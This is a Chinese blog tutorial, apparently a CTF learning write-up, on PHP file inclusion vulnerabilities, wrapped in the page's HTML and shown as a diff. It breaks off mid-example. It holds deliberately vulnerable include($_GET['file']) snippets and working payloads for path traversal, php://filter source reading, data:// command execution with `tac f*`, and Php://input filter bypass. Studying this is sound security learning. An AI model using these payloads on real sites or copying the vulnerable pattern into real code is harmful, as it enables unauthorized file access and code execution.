@@ -1,0 +1,1623 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+  
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="文件包含," />
+
+
+
+
+
+  <link rel="alternate" href="/%5Bobject%20Object%5D" title="quan9i's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="功成未必在我，功成一定有我。 前言近期发现文件包含这方面几乎一窍不通，特来对此漏洞进行简单学习，并总结如下，希望能对正在学习文件包含的师傅们有些许帮助。 漏洞相关信息漏洞成因123后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就被称为文件包含。文件包含的存在使得开发变得更加灵活和方便，但同时也带了安全问题，导致客户端可以远程调用文件，造成文件包含漏洞。这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析文件包含">
+<meta property="og:url" content="https://quan9i.top/fileinclude/index.html">
+<meta property="og:site_name" content="quan9i&#39;s blog">
+<meta property="og:description" content="功成未必在我，功成一定有我。 前言近期发现文件包含这方面几乎一窍不通，特来对此漏洞进行简单学习，并总结如下，希望能对正在学习文件包含的师傅们有些许帮助。 漏洞相关信息漏洞成因123后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就被称为文件包含。文件包含的存在使得开发变得更加灵活和方便，但同时也带了安全问题，导致客户端可以远程调用文件，造成文件包含漏洞。这">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a8d2c2940abd43c3b9908bb76e63d9be.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/581bbedc48a5457ebaf3f9d1b5f66b87.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/366cced637804255b89f07d6b4a8f544.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/bddd991c683a4a0b98e5f61e849a6c82.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e10df877d7eb485bba25104c4ab8ed1b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e9c74cc08ef84612b11b7a3ead48f787.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/93e55ab5077844b4a397f68b6b45b6f4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a876467fdbb04376b3bc9dd2da135495.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b73e7166d7ac4ed9b565a244873bd6e3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2f5d1ee1a4f64190b7a8f10229b13d0b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/850780230103436592fa84b20dcdc203.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/17e10d55bb6148c385a9b998ce07b542.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4209cfa1502f47bba0675266184e025e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4a0fa225e5084e76be5f0537a3a7305d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d106c76c9f4443079abf490a493780ce.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6b9088b4e3884f24a8dac7fd0ac35c16.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c5e4f1b785df4456b5c428a3eb36bfb1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6b4c93bc6ba840868ab9796782f190ba.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3d9018875f1a418488c3af937b905458.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d137920438084804a6fd3804ecb5ef76.png">
+<meta property="article:published_time" content="2022-04-07T02:28:18.755Z">
+<meta property="article:modified_time" content="2022-04-07T10:13:42.863Z">
+<meta property="article:author" content="quan9i">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/a8d2c2940abd43c3b9908bb76e63d9be.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://quan9i.top/fileinclude/"/>
+
+
+
+
+
+  <title>浅析文件包含 | quan9i's blog</title>
+  
+
+
+
+
+
+
+
+
+
+    <!--pjax：防止跳转页面音乐暂停-->
+  <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> 
+<meta name="generator" content="Hexo 5.4.0"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}</style></head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">quan9i's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">少年有梦不应止于心动 更要付诸 行动</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star-half-o"></i> <br />
+            
+            精选文案
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-liuyan">
+          <a href="/liuyan/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-zanshang">
+          <a href="/zanshang/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-rocket"></i> <br />
+            
+            赞赏
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+<script src="/live2d-widget/autoload.js"></script>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://quan9i.top/fileinclude/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="quan9i's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">浅析文件包含</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-04-07T10:28:18+08:00">
+                2022-04-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url" rel="index">
+                    <span itemprop="name">文件包含</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/fileinclude/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/fileinclude/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  5.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  25
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://img-blog.csdnimg.cn/a8d2c2940abd43c3b9908bb76e63d9be.png" alt="在这里插入图片描述"><br>功成未必在我，功成一定有我。</p>
+<h1><span id="前言">前言</span></h1><p>近期发现文件包含这方面几乎一窍不通，特来对此漏洞进行简单学习，并总结如下，希望能对正在学习文件包含的师傅们有些许帮助。</p>
+<h1><span id="漏洞相关信息">漏洞相关信息</span></h1><h2><span id="漏洞成因">漏洞成因</span></h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就</span><br><span class="line">被称为文件包含。文件包含的存在使得开发变得更加灵活和方便，但同时也带了安全问题，导致客户端</span><br><span class="line">可以远程调用文件，造成文件包含漏洞。这个漏洞在php中十分常见，其他语言也有。</span><br></pre></td></tr></table></figure>
+<h2><span id="漏洞危害">漏洞危害</span></h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件包含漏洞可能带来的危害有：</span><br><span class="line">1、web服务器的文件被外界浏览，导致信息泄露；</span><br><span class="line">2、脚本被任意执行，导致网站被篡改。文件包含漏洞是一种常见的依赖于脚本运行而影响web应用程序</span><br><span class="line">的漏洞。</span><br></pre></td></tr></table></figure>
+<h2><span id="漏洞分类">漏洞分类</span></h2><p>1.本地文件包含漏洞<br>本地的话简单理解就是网页本身存在着恶意文件，我们对其进行调用，从而获取信息等</p>
+<p>2.远程文件包含漏洞（需要php.ini开启了allow_url_fopen和allow_url_include）<br>远程简单理解就是网页本身不存在恶意文件，我们取别的地方的文件包含进去，包含的文件是第三方服务器的文件。</p>
+<h2><span id="漏洞常用函数">漏洞常用函数</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">主流文件包含php一些函数的含义：</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>() :执行到<span class="keyword">include</span>()才包含文件，找不到包含文件只产生警告，还会接着运行后面的脚本</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(): 只要程序一运行就会包含文件，找不到包含文件则会报错，并且脚本终止运行</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>():执行到<span class="keyword">include</span>()才包含文件，找不到包含文件只产生警告，还会接着运行后面的脚本</span><br><span class="line">_once()后缀表明只会包含一次，已包含则不会再包含</span><br><span class="line"><span class="keyword">require_once</span>()：只要程序一运行就会包含文件，找不到包含文件则会报错，并且脚本终止运行</span><br><span class="line">_once()后缀表明只会包含一次，已包含则不会再包含</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1><span id="利用方法">利用方法</span></h1><p>最常用的是伪协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// 协议：</span></span><br><span class="line">        条件 allow_url_fopen:off/on  allow_url_include :off/on</span><br><span class="line">        作用：用于访问本地文件系统。在<span class="keyword">include</span>()/<span class="keyword">require</span>()等参数可控的情况下</span><br><span class="line">             如果导入非php文件也会被解析为php</span><br><span class="line">        用法：</span><br><span class="line">            <span class="number">1</span>.file:<span class="comment">//[文件的绝对路径和文件名]</span></span><br><span class="line">            <span class="number">2</span>.[文件的相对路径和文件名]</span><br><span class="line">            <span class="number">3</span>.[http：<span class="comment">//网络路径和文件名]</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">// 协议：</span></span><br><span class="line">        常见形式：php:<span class="comment">//input php://stdin php://memory php://temp</span></span><br><span class="line">        条件 allow_url_include需要 on allow_url_fopen:off/on</span><br><span class="line">        作用：php:<span class="comment">// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter</span></span><br><span class="line">            和php:<span class="comment">//input，php://filter用于读取源码，php://input用于执行php代码</span></span><br><span class="line">        php:<span class="comment">//filter参数详解：resource=（必选，指定了你要筛选过滤的数据流）     </span></span><br><span class="line">        read=（可选）    write=（可选）</span><br><span class="line">        对read和write，可选过滤器有<span class="keyword">string</span>.rot13、<span class="keyword">string</span>.toupper</span><br><span class="line">        、<span class="keyword">string</span>.tolower、<span class="keyword">string</span>.strip_tags、convert.base64-encode </span><br><span class="line">        &amp; convert.base64-decode</span><br><span class="line">         用法举例：php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">                    网址+?page=php:<span class="comment">//filter/convert.base64-encode/resource=文件名</span></span><br><span class="line"></span><br><span class="line">zip:<span class="comment">// bzip2:// zlib:// 协议：</span></span><br><span class="line">        条件：allow_url_fopen:off/on      allow_url_include :off/on</span><br><span class="line">        作用：zip:<span class="comment">// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件</span></span><br><span class="line">            更重要的是不需要指定后缀名</span><br><span class="line">        用法：zip:<span class="comment">//[压缩文件绝对路径]%23[压缩文件内的子文件名]</span></span><br><span class="line">             compress.bzip2:<span class="comment">//file.bz2</span></span><br><span class="line">             compress.zlib:<span class="comment">//file.gz</span></span><br><span class="line">        其中phar:<span class="comment">//和zip://类似</span></span><br><span class="line"></span><br><span class="line">data:<span class="comment">// 协议：</span></span><br><span class="line">        条件：allow_url_fopen:on    allow_url_include :on</span><br><span class="line">        作用：可以使用data:<span class="comment">//数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</span></span><br><span class="line">        用法：data:<span class="comment">//text/plain,            data://text/plain;base64,</span></span><br><span class="line">        举例：data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">             data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>
+<p>其次还有条件竞争</p>
+<p>条件竞争就是两个或者多个进程或者线程同时处理一个资源（全局变量，文件）产生非预想的执行效果，从而产生程序执行流的改变，从而达到攻击的目的。</p>
+<p>条件竞争需要如下的条件：</p>
+<pre><code>并发，即至少存在两个并发执行流。这里的执行流包括线程，进程，任务等级别的执行流。
+共享对象，即多个并发流会访问同一对象。常见的共享对象有共享内存，文件系统，信号。一般来说，这些共享对象是用来使得多个程序执行流相互交流。此外，我们称访问共享对象的代码为临界区。在正常写代码时，这部分应该加锁。
+改变对象，即至少有一个控制流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。
+</code></pre>
+<p>以及包含日志文件和绕死亡die这些，我将会在下方的实战中进行具体讲解</p>
+<h1><span id="实战">实战</span></h1><h2><span id="无限制本地包含实战">无限制本地包含实战</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>我将flag放到上一级目录下<br>此时我们访问网站<br><img src="https://img-blog.csdnimg.cn/581bbedc48a5457ebaf3f9d1b5f66b87.png"><br>想要得到flag只需构造如下payload即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../flag</span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/366cced637804255b89f07d6b4a8f544.png" alt="在这里插入图片描述"></p>
+<h2><span id="有后缀的本地包含实战">有后缀的本地包含实战</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时我们可以发现代码强行给变量加了一个.php后缀，而我们的flag没有.php后缀，我们想要进行获取flag的话就不能够让.php发挥作用，因此我们此时可以通过以下几种方法来对其进行截断（ 需要 magic_quotes_gpc=off，PHP小于5.3.4）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">00</span>截断</span><br><span class="line"></span><br><span class="line">路径长度截断</span><br><span class="line"><span class="comment"># Linux 需要文件名长于 4096，Windows 需要长于 256</span></span><br><span class="line"></span><br><span class="line">点号截断</span><br><span class="line"><span class="comment"># 只适用 Windows，点号需要长于 256</span></span><br></pre></td></tr></table></figure>
+<p>具体如下<br><img src="https://img-blog.csdnimg.cn/bddd991c683a4a0b98e5f61e849a6c82.png" alt="在这里插入图片描述"></p>
+<h2><span id="文件包含实战简单">文件包含实战(简单)</span></h2><h3><span id="0x01">0X01</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload如下即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<h3><span id="0x02">0X02</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了php，我们可以用data伪协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?=</span> `tac f*`<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h3><span id="0x03">0X03</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>虽然过滤了php和data，但是并未过滤大小写呀，我们可以用大小写进行绕过<br>在这里我使用input伪协议，因为data伪协议需要<code>allow_url_fopen:on    allow_url_include :on</code><br>这里条件不满足，但是我不知道为什么filter在这里也无法使用，暂时保留疑问<br>在url后插入如下语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=Php:<span class="comment">//input</span></span><br><span class="line"><span class="comment">#记得要大写</span></span><br></pre></td></tr></table></figure>
+<p>然后在post中插入如下数据</p>
